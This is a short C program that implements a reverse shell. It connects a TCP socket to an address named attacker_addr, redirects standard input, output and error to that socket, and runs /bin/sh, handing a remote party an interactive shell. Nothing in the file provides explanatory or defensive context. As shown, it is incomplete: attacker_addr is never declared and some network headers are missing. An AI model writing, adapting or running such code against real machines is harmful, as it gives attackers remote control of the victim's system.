#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>

int main() {
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (connect(sockfd, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr)) < 0) {
    // error connecting to server
    return 1;
  }
  // redirect standard I/O to the socket
  dup2(sockfd, 0);
  dup2(sockfd, 1);
  dup2(sockfd, 2);
  // execute shell
  execve("/bin/sh", NULL, NULL);
  return 0;
}
